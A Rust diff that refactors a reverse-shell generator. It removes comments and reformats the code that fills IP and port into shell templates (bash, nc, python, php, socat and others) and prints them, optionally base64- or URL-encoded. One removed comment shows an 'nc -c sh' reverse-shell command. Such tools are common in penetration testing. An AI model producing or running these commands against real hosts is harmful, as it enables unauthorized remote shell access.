@@ -1,29 +1,30 @@
 use base64::Engine;
 use inline_colorization::*;
 
-use crate::FORMATS_DIR;        //the ../../formats folder is included as crate
+use crate::FORMATS_DIR;
 
 fn process_template(entry: &str, template: &str, ip: &str, port: u16, b64: bool, url: bool) {
     let coloured_ip = format!("{color_cyan}{}{color_reset}", ip);
     let coloured_port = format!("{color_cyan}{}{color_reset}", &port.to_string());
-    let result = template                                                                //The templates look like this "nc -c sh {{IP}} {{PORT}}",
-        .replace("{{IP}}", &coloured_ip)                                                 //we replace those keywords with the given informations.
+    let result = template
+        .replace("{{IP}}", &coloured_ip)
         .replace("{{PORT}}", &coloured_port);
 
-    println!("----------{}-----------\n{}", entry.to_ascii_uppercase(), result);
+    println!(
+        "----------{}-----------\n{}",
+        entry.to_ascii_uppercase(),
+        result
+    );
 
-    if b64 {                                                                            //If subcommand --b64 was sent, print the base64 encoded shell
+    if b64 {
         println!(
             "base64: {}",
             base64::prelude::BASE64_STANDARD.encode(&result)
         );
     }
 
-    if url {                                                                            //Same thing for --url subcommand
-        println!(
-            "url: {}",
-            urlencoding::encode(&result)
-        );
+    if url {
+        println!("url: {}", urlencoding::encode(&result));
     }
     println!();
 }
@@ -37,12 +38,11 @@ pub fn run(ip: String, port: u16, format: String, b64: bool, url: bool) {
     println!("Port   : {}", port);
     println!("~~~~~~~~~~~~~~~~~~~~~~~~~\n");
 
-    if format == "all" {                                                        //If subcommand --format is "all", prints every bloody shell known in history.
-                                                                                //Probably pointless, but why not?
+    if format == "all" {
         for file in FORMATS_DIR.files() {
             let path = file.path();
 
-            let file_name = match path.file_stem().and_then(|s| s.to_str()) {    //Does the file exist? => Stores the file name in `file_name`
+            let file_name = match path.file_stem().and_then(|s| s.to_str()) {
                 Some(name) => name,
                 None => {
                     eprintln!("Invalid file name: {:?}", path);
@@ -50,7 +50,7 @@ pub fn run(ip: String, port: u16, format: String, b64: bool, url: bool) {
                 }
             };
 
-            let template = match file.contents_utf8() {                            //Is the file readable? => Stores the file content in `template`
+            let template = match file.contents_utf8() {
                 Some(t) => t.to_string(),
                 None => {
                     eprintln!("Cannot read file {:?}", path);
@@ -58,27 +58,24 @@ pub fn run(ip: String, port: u16, format: String, b64: bool, url: bool) {
                 }
             };
 
-            process_template(file_name, &template, &ip, port, b64, url);            //Feed the process_template function with all parameters
+            process_template(file_name, &template, &ip, port, b64, url);
         }
-
-    } else if format == "top" {                                            //If subcommand0 --format is "top", prints the top 10 shells in the vriable format below
+    } else if format == "top" {
         let formats = [
-            "bash-i", "nc-e", "python", "python3",
-            "php", "socat", "perl", "ruby",
-            "bash196", "telnet",
+            "bash-i", "nc-e", "python", "python3", "php", "socat", "perl", "ruby", "bash196",
+            "telnet",
         ];
 
-        for fmt in formats {                                            //For each format, fetch the corresponding template with get_template()
+        for fmt in formats {
             let template = match get_template(fmt) {
                 Some(t) => t,
                 None => continue,
             };
 
-            process_template(fmt, &template, &ip, port, b64, url);        //And process them
+            process_template(fmt, &template, &ip, port, b64, url);
         }
-
     } else {
-        let template = match get_template(&format) {                    //If --format is an actual format, performs the process once
+        let template = match get_template(&format) {
             Some(t) => t,
             None => return,
         };
@@ -87,7 +84,7 @@ pub fn run(ip: String, port: u16, format: String, b64: bool, url: bool) {
     }
 }
 
-fn get_template(format: &str) -> Option<String> {                //Looks for a file in ../../formats and if found it returns the file content
+fn get_template(format: &str) -> Option<String> {
     let filename = format!("{}.sf", format);
 
     let file = FORMATS_DIR.get_file(&filename)?;
